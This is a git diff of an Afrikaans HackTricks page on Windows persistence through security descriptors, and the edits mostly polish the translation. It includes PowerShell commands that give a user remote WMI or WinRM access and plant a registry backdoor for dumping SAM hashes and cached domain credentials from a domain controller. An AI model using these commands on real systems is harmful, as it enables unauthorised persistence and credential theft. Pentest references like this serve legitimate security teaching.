@@ -8,9 +8,9 @@ Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size=
 
 <summary>Ondersteun HackTricks</summary>
 
-* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Deel hacking truuks deur PR's in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Kyk na die [**subskripsieplanne**](https://github.com/sponsors/carlospolop)!
+* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 {% endhint %}
@@ -25,7 +25,7 @@ Dan is hierdie volhardingstegniek gebaseer op die vermoë om elke voorreg wat te
 
 ### Toegang tot WMI
 
-Jy kan 'n gebruiker toegang gee om **afgeleë WMI** [**uit te voer**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1):
+Jy kan 'n gebruiker toegang gee om **afgeleë WMI** [**te voer**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1):
 ```bash
 Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc –namespace 'root\cimv2' -Verbose
 Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc–namespace 'root\cimv2' -Remove -Verbose #Remove
@@ -37,9 +37,9 @@ Gee toegang tot **winrm PS-konsol aan 'n gebruiker** [**gebruik hierdie**](https
 Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Verbose
 Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Remove #Remove
 ```
-### Remote access to hashes
+### Afgeleë toegang tot hashes
 
-Toegang tot die **register** en **dump hashes** deur 'n **Reg backdoor te skep met** [**DAMP**](https://github.com/HarmJ0y/DAMP)**,** sodat jy op enige tydstip die **hash van die rekenaar**, die **SAM** en enige **gecacheerde AD** geloofsbrief in die rekenaar kan terugkry. Dit is dus baie nuttig om hierdie toestemming aan 'n **gewone gebruiker teen 'n Domeinbeheerder rekenaar** te gee:
+Toegang tot die **register** en **dump hashes** deur 'n **Reg agterdeur te skep met** [**DAMP**](https://github.com/HarmJ0y/DAMP)**,** sodat jy op enige tydstip die **hash van die rekenaar**, die **SAM** en enige **gekas AD** geloofsbrief in die rekenaar kan terugkry. Dit is dus baie nuttig om hierdie toestemming aan 'n **gewone gebruiker teen 'n Domeinbeheerder rekenaar** te gee:
 ```bash
 # allows for the remote retrieval of a system's machine and local account hashes, as well as its domain cached credentials.
 Add-RemoteRegBackdoor -ComputerName <remotehost> -Trustee student1 -Verbose
